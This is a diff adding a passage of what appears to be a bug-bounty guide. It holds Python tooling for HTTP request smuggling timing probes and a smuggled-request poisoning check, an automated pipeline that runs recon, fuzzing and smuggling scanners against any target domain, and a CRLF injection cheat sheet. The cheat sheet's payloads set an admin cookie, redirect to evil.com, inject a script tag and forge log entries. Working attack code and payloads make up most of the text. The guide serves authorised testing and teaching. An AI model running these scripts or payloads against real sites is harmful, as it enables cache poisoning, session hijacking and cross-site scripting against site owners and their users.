+    # ── Test runners ───────────────────────────────────────────────
+
+    def test_clte(self):
+        print(f"\n{Fore.YELLOW}[CL.TE Timing Probe]{Style.RESET_ALL}")
+        print("  Sending CL=4, TE=chunked, body ends with invalid chunk 'X'")
+        print("  If back-end hangs waiting for valid chunk → TIMEOUT = vulnerable")
+
+        payload = self.build_clte_timing()
+        resp, elapsed = self.send_recv(payload, "CLTE-timing")
+
+        print(f"  Response time: {elapsed:.2f}s")
+        if elapsed >= 5:
+            print(f"{Fore.RED}  [!!!] CL.TE TIMING ANOMALY ({elapsed:.1f}s) — POTENTIAL VULNERABILITY!{Style.RESET_ALL}")
+            return "CL.TE"
+        print("  [-] No CL.TE timing anomaly")
+        return None
+
+    def test_tecl(self):
+        print(f"\n{Fore.YELLOW}[TE.CL Timing Probe]{Style.RESET_ALL}")
+        print("  Sending CL=6, TE=chunked, body = '0\\r\\n\\r\\nX'")
+        print("  If back-end hangs waiting for CL bytes → TIMEOUT = vulnerable")
+
+        payload = self.build_tecl_timing()
+        resp, elapsed = self.send_recv(payload, "TECL-timing")
+
+        print(f"  Response time: {elapsed:.2f}s")
+        if elapsed >= 5:
+            print(f"{Fore.RED}  [!!!] TE.CL TIMING ANOMALY ({elapsed:.1f}s) — POTENTIAL VULNERABILITY!{Style.RESET_ALL}")
+            return "TE.CL"
+        print("  [-] No TE.CL timing anomaly")
+        return None
+
+    def test_tete(self):
+        obfuscations = [
+            "Transfer-Encoding: xchunked",
+            "Transfer-Encoding: x-chunked",
+            "Transfer-Encoding: chunked, dav",
+            "Transfer-Encoding: CHUNKED",
+            " Transfer-Encoding: chunked",
+            "Transfer-Encoding:chunked",
+            "X-Transfer-Encoding: chunked",
+        ]
+
+        print(f"\n{Fore.YELLOW}[TE.TE Obfuscation Probes]{Style.RESET_ALL}")
+        for ob in obfuscations:
+            print(f"  Trying: {ob.strip()!r}")
+            payload = self.build_tete_probe(ob)
+            resp, elapsed = self.send_recv(payload)
+            print(f"    Time: {elapsed:.2f}s", end="")
+            if elapsed >= 5:
+                print(f" {Fore.RED}← TIMEOUT! TE.TE via this obfuscation!{Style.RESET_ALL}")
+                return "TE.TE", ob
+            print()
+        return None, None
+
+    def test_differential(self):
+        print(f"\n{Fore.YELLOW}[Differential Response Test]{Style.RESET_ALL}")
+        print("  1. Baseline: GET /")
+
+        baseline_resp, _ = self.send_recv(self.build_normal("/"))
+        baseline_status = self._status(baseline_resp)
+        print(f"     Status: {baseline_status}")
+
+        print("  2. Send CL.TE probe with smuggled GET /NONEXISTENT_PATH_12345")
+        probe = self.build_clte_exploit("/NONEXISTENT_PATH_12345", self.host)
+        _, _ = self.send_recv(probe)
+
+        print("  3. Follow-up GET / (should be poisoned)")
+        check_resp, _ = self.send_recv(self.build_normal("/"))
+        check_status = self._status(check_resp)
+        print(f"     Status: {check_status}")
+
+        if check_status == "404" and baseline_status != "404":
+            print(f"{Fore.RED}  [!!!] DIFFERENTIAL CONFIRMED! "
+                  f"Baseline {baseline_status} → Poisoned {check_status}{Style.RESET_ALL}")
+            return True
+        print("  [-] No differential detected")
+        return False
+
+    def run_all(self):
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"  HRS ENGINE — {self.host}:{self.port}")
+        print(f"{'='*60}{Style.RESET_ALL}")
+
+        findings = []
+        t = self.test_clte()
+        if t:
+            findings.append(t)
+        t = self.test_tecl()
+        if t:
+            findings.append(t)
+        t, ob = self.test_tete()
+        if t:
+            findings.append(f"{t} via {ob}")
+        confirmed = self.test_differential()
+        if confirmed:
+            findings.append("CL.TE (differential confirmed)")
+
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"  SUMMARY: {len(findings)} finding(s)")
+        for f in findings:
+            print(f"  → {f}")
+        print(f"{'='*60}{Style.RESET_ALL}")
+        return findings
+
+
+def main():
+    p = argparse.ArgumentParser(description="HRS Engine")
+    p.add_argument("-u", "--url", required=True)
+    p.add_argument("-t", "--timeout", type=int, default=15)
+    args = p.parse_args()
+
+    from urllib.parse import urlparse
+    parsed = urlparse(args.url)
+    host = parsed.hostname
+    port = parsed.port or (443 if parsed.scheme == "https" else 80)
+    use_ssl = parsed.scheme == "https"
+
+    engine = HRSEngine(host, port, use_ssl, args.timeout)
+    engine.run_all()
+
+if __name__ == "__main__":
+    main()
+```
+
+### Script 3: Full Pipeline Orchestrator
+
+```python
+#!/usr/bin/env python3
+"""
+full_pipeline.py — Complete automated HPP + HRS + CRLF pipeline
+Usage: python3 full_pipeline.py -t target.com
+"""
+
+import subprocess
+import sys
+import os
+import json
+import argparse
+from datetime import datetime
+from pathlib import Path
+
+class Pipeline:
+
+    def __init__(self, target, out_dir=None, proxy=None):
+        self.target = target
+        self.base_url = f"https://{target}"
+        self.proxy = proxy
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        self.out = Path(out_dir or f"pipeline_{target}_{ts}")
+        (self.out / "recon").mkdir(parents=True, exist_ok=True)
+        (self.out / "hpp").mkdir(exist_ok=True)
+        (self.out / "hrs").mkdir(exist_ok=True)
+        (self.out / "crlf").mkdir(exist_ok=True)
+        (self.out / "reports").mkdir(exist_ok=True)
+        self.vulns = []
+
+    def run(self, cmd, label=""):
+        """Run a shell command, return stdout"""
+        print(f"  [>] {label or cmd[:60]}")
+        try:
+            r = subprocess.run(cmd, shell=True, capture_output=True,
+                               text=True, timeout=300)
+            return r.stdout + r.stderr
+        except subprocess.TimeoutExpired:
+            return "TIMEOUT"
+        except Exception as e:
+            return f"ERROR: {e}"
+
+    def log_vuln(self, msg):
+        self.vulns.append(msg)
+        print(f"\n{'!'*60}")
+        print(f"  [VULNERABILITY] {msg}")
+        print(f"{'!'*60}\n")
+
+    # ── Phase 1: Recon ─────────────────────────────────────────────
+
+    def phase_recon(self):
+        print(f"\n{'='*60}\n  PHASE 1: RECON\n{'='*60}")
+
+        # Collect URLs
+        gau = self.run(
+            f"gau {self.target} 2>/dev/null | "
+            f"grep -v '\\.\\(jpg\\|png\\|css\\|gif\\|ico\\)$' | sort -u",
+            "gau URL collection"
+        )
+        url_file = self.out / "recon" / "all_urls.txt"
+        url_file.write_text(gau)
+        print(f"  URLs collected: {gau.count(chr(10))}")
+
+        # httpx probe
+        self.run(
+            f"cat {url_file} | httpx -silent -json "
+            f"-status-code -web-server -tech-detect -http2 "
+            f"-include-response-header "
+            f"-o {self.out}/recon/httpx.json 2>/dev/null",
+            "httpx probing"
+        )
+
+        # Score HRS candidates
+        candidates = self._score_hrs_candidates()
+        cand_file = self.out / "recon" / "hrs_candidates.txt"
+        cand_file.write_text("\n".join(candidates))
+        print(f"  HRS candidates: {len(candidates)}")
+
+        # CRLFuzz
+        self.run(
+            f"crlfuzz -l {url_file} -s -c 15 "
+            f"-o {self.out}/crlf/crlfuzz_results.txt 2>/dev/null",
+            "CRLFuzz scan"
+        )
+        crlf_file = self.out / "crlf" / "crlfuzz_results.txt"
+        if crlf_file.exists() and crlf_file.stat().st_size > 0:
+            self.log_vuln(f"CRLF Injection found — see {crlf_file}")
+
+    def _score_hrs_candidates(self):
+        proxy_signals = ['via', 'x-served-by', 'cf-ray', 'x-cache',
+                         'x-amz-cf', 'x-varnish', 'fastly']
+        candidates = []
+        httpx_file = self.out / "recon" / "httpx.json"
+        if not httpx_file.exists():
+            return [self.base_url]
+        for line in httpx_file.read_text().splitlines():
+            try:
+                d = json.loads(line)
+                headers = {k.lower(): v.lower()
+                           for k, v in (d.get("headers") or {}).items()}
+                score = 0
+                for sig in proxy_signals:
+                    if any(sig in h for h in headers):
+                        score += 2
+                if d.get("http2"):
+                    score += 2
+                if score > 0:
+                    candidates.append(d.get("url", ""))
+            except Exception:
+                pass
+        return candidates or [self.base_url]
+
+    # ── Phase 2: HPP ───────────────────────────────────────────────
+
+    def phase_hpp(self):
+        print(f"\n{'='*60}\n  PHASE 2: HPP TESTING\n{'='*60}")
+
+        # Arjun parameter discovery
+        arjun_out = self.out / "hpp" / "arjun.json"
+        self.run(
+            f"python3 -m arjun -u {self.base_url}/ "
+            f"-m GET -q -o {arjun_out} 2>/dev/null",
+            "Arjun parameter discovery"
+        )
+
+        # ffuf HPP fuzzing on critical params
+        crit_params = ["role", "admin", "status", "price", "redirect", "type"]
+        for param in crit_params:
+            self.run(
+                f"ffuf -u '{self.base_url}/?{param}=user&{param}=FUZZ' "
+                f"-w ~/wordlists/hpp_values.txt "
+                f"-mc 200 -fc 404 -s "
+                f"-o {self.out}/hpp/ffuf_{param}.json -of json 2>/dev/null",
+                f"ffuf HPP: {param}"
+            )
+
+        # Nuclei HPP templates
+        self.run(
+            f"nuclei -u {self.base_url} "
+            f"-t ~/custom-nuclei-templates/hpp-detection.yaml "
+            f"-silent -o {self.out}/hpp/nuclei_hpp.txt 2>/dev/null",
+            "nuclei HPP"
+        )
+        nuclei_hpp = self.out / "hpp" / "nuclei_hpp.txt"
+        if nuclei_hpp.exists() and nuclei_hpp.stat().st_size > 0:
+            self.log_vuln(f"HPP via nuclei — {nuclei_hpp}")
+
+    # ── Phase 3: HRS ───────────────────────────────────────────────
+
+    def phase_hrs(self):
+        print(f"\n{'='*60}\n  PHASE 3: HRS TESTING\n{'='*60}")
+
+        cand_file = self.out / "recon" / "hrs_candidates.txt"
+        if not cand_file.exists():
+            cand_file.write_text(self.base_url)
+
+        for url in cand_file.read_text().splitlines():
+            if not url.strip():
+                continue
+            slug = abs(hash(url)) % 100000
+
+            # smuggler.py
+            out_f = self.out / "hrs" / f"smuggler_{slug}.txt"
+            self.run(
+                f"timeout 90 python3 ~/sec-tools/smuggler/smuggler.py "
+                f"-u {url} -t 12 -o {out_f} 2>/dev/null",
+                f"smuggler.py → {url[:50]}"
+            )
+            if out_f.exists():
+                content = out_f.read_text().lower()
+                if "potential" in content or "vulnerable" in content:
+                    self.log_vuln(f"HRS (smuggler.py) at {url} — {out_f}")
+
+            # h2csmuggler
+            h2c_out = self.out / "hrs" / f"h2c_{slug}.txt"
+            result = self.run(
+                f"timeout 30 python3 ~/sec-tools/h2csmuggler/h2csmuggler.py "
+                f"--test {url} 2>/dev/null",
+                f"h2csmuggler → {url[:50]}"
+            )
+            h2c_out.write_text(result)
+            if "accepted" in result.lower():
+                self.log_vuln(f"H2C Smuggling at {url}")
+
+            # nuclei HRS
+            n_out = self.out / "hrs" / f"nuclei_{slug}.txt"
+            self.run(
+                f"nuclei -u {url} "
+                f"-t http/vulnerabilities/http-request-smuggling/ "
+                f"-silent -rate-limit 3 -o {n_out} 2>/dev/null",
+                f"nuclei HRS → {url[:50]}"
+            )
+            if n_out.exists() and n_out.stat().st_size > 0:
+                self.log_vuln(f"HRS (nuclei) at {url} — {n_out}")
+
+    # ── Phase 4: Report ────────────────────────────────────────────
+
+    def phase_report(self):
+        print(f"\n{'='*60}\n  PHASE 4: REPORT\n{'='*60}")
+
+        report = f"""# Security Pipeline Report
+## Target: {self.target}
+## Date: {datetime.now().isoformat()}
+
+## Vulnerabilities Found: {len(self.vulns)}
+
+"""
+        for v in self.vulns:
+            report += f"- {v}\n"
+
+        report += f"""
+
+## Files
+- Recon:  {self.out}/recon/
+- HPP:    {self.out}/hpp/
+- HRS:    {self.out}/hrs/
+- CRLF:   {self.out}/crlf/
+
+## Manual Next Steps
+1. Confirm HRS with Burp Suite differential response
+2. Escalate CRLF to XSS or session fixation
+3. Verify HPP with actual business impact
+4. Document PoC steps
+"""
+        report_path = self.out / "reports" / "REPORT.md"
+        report_path.write_text(report)
+        print(f"  Report: {report_path}")
+        print(f"  Vulnerabilities: {len(self.vulns)}")
+
+    def run_all(self):
+        print(f"\n{'#'*60}")
+        print(f"  FULL PIPELINE — {self.target}")
+        print(f"  Output: {self.out}/")
+        print(f"{'#'*60}")
+        self.phase_recon()
+        self.phase_hpp()
+        self.phase_hrs()
+        self.phase_report()
+        print(f"\n[+] Pipeline complete. Output: {self.out}/")
+
+
+def main():
+    p = argparse.ArgumentParser(description="Full Security Pipeline")
+    p.add_argument("-t", "--target", required=True, help="Target domain")
+    p.add_argument("-o", "--output", default=None, help="Output directory")
+    p.add_argument("--proxy", default=None, help="Proxy URL")
+    args = p.parse_args()
+
+    Pipeline(args.target, args.output, args.proxy).run_all()
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 6.13 CRLF Quick Reference
+
+### Payload Encoding Table
+
+```
+══════════════════════════════════════════════════════════════
+         CRLF PAYLOAD ENCODING CHEAT SHEET
+══════════════════════════════════════════════════════════════
+
+CONTEXT               PAYLOAD
+──────────────────────────────────────────────────────────────
+URL parameter         %0d%0aHeader: value
+                      %0aHeader: value
+                      %0D%0AHeader: value
+Double encoded        %250d%250aHeader: value
+Unicode               %u000d%u000aHeader: value
+Java/JSON escape      \u000d\u000aHeader: value
+Multi-byte            %E5%98%8A%E5%98%8D (looks like \n\r)
+With hash             %23%0d%0aHeader: value  (after # = fragment)
+With question         %3f%0d%0aHeader: value  (after ? = new param)
+
+COMMON INJECTION TARGETS
+──────────────────────────────────────────────────────────────
+Response header inject:  %0d%0aX-Custom: injected
+Cookie set:             %0d%0aSet-Cookie: admin=1; Path=/
+Redirect inject:        %0d%0aLocation: https://evil.com
+XSS via content-type:   %0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>
+Log inject:             %0d%0a[FAKE LOG ENTRY] GET /admin 200
+Response split:         %0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a...
+
+HOW TO CONFIRM
+──────────────────────────────────────────────────────────────
+1. Inject: ?param=value%0d%0aX-Test:%20confirmed
+2. Check response headers for: X-Test: confirmed
+3. If present → CRLF injection confirmed!
+══════════════════════════════════════════════════════════════
+```
+
+### HTTP Indentation Rules Recap
+
+```
+══════════════════════════════════════════════════════════════
+      HTTP INDENTATION & CRLF STRUCTURE — MASTER REFERENCE
+══════════════════════════════════════════════════════════════
+
+[REQUEST LINE]    verb SP path SP version CRLF
+[HEADER]          name COLON SP value CRLF
+[HEADER]          name COLON SP value CRLF
+    [FOLD]            SP or HT continuation-value CRLF  ← OBSOLETE
+[BLANK LINE]      CRLF  (just \r\n, no content)
+[BODY]            raw bytes (for POST/PUT)
+
+[CHUNKED BODY]
+  hex-size CRLF       ← chunk size in hex
+  chunk-data CRLF     ← that many bytes
+  hex-size CRLF       ← next chunk
+  chunk-data CRLF
+  0 CRLF              ← terminal chunk
+  CRLF                ← mandatory blank line after terminal
+
+CRITICAL BYTES:
+  Every \r\n = 0x0D 0x0A (2 bytes)
+  Blank line = 0x0D 0x0A 0x0D 0x0A (4 bytes)
+  Terminal chunk = 0x30 0x0D 0x0A 0x0D 0x0A (5 bytes: "0\r\n\r\n")
+
+COMMON MISTAKES IN SMUGGLING PAYLOADS:
+  ✗ Missing \r\n after chunk data → back-end rejects
+  ✗ Missing blank line after "0" → back-end waits for it
+  ✗ Extra \r\n in wrong place → request malformed
+  ✗ CL counts wrong → smuggled bytes cut off or too long
+══════════════════════════════════════════════════════════════
+```
+
+---
+
+## 6.14 Tool Comparison Matrix
+
+| Tool | HPP | HRS CL.TE | HRS TE.CL | TE.TE | H2C | CRLF | Auto |
+|------|:---:|:---------:|:---------:|:-----:|:---:|:----:|:----:|
+| smuggler.py | — | ✅ | ✅ | ✅ | — | — | Partial |
+| HTTP Req Smuggler (Burp) | — | ✅ | ✅ | ✅ | ✅ | — | ✅ |
+| h2csmuggler | — | — | — | — | ✅ | — | Partial |
+| crlfuzz | — | — | — | — | — | ✅ | ✅ |
+| nuclei | Partial | ✅ | ✅ | — | — | ✅ | ✅ |
+| Arjun | ✅ | — | — | — | — | — | ✅ |
+| ffuf | ✅ | — | — | — | — | ✅ | ✅ |
+| httpx | (recon) | — | — | — | — | — | ✅ |
+| hrs_engine.py | — | ✅ | ✅ | ✅ | — | — | — |
+| crlf_tester.py | — | — | — | — | — | ✅ | ✅ |
+| h2c_raw_detector.py | — | — | — | — | ✅ | ✅ | — |
+| full_pipeline.py | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
+
+---
+
+> **⚠️ Legal Disclaimer:** All tools, scripts, and techniques described here are for authorized security testing and educational purposes only. Always obtain written permission before testing any system. Unauthorized testing is illegal. The author bears no responsibility for misuse.
+
+---
+
+*Guide Version: 3.0 | Covers: HPP · HRS (CL.TE, TE.CL, TE.TE, H2) · CRLF Injection · Full Automation*
+*References: PortSwigger Research · OWASP · Real-World Bug Hunting · Bug Bounty Bootcamp · James Kettle DEF CON 27*
